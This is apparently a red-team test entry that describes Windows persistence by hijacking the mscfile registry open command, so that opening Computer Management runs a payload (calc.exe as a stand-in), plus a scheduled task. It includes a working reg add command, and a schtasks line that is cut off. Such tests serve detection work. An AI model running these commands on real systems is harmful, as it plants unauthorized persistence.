Test Description: Adds persistence by abusing `compmgmt.msc` via a scheduled task.\nWhen the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.. Command/Steps: reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\" /ve /t REG_EXPAND_SZ /d \\\"c:\\\\windows\\\\System32\\\\#{payload}\\\" /f\nschtasks /Create /..."
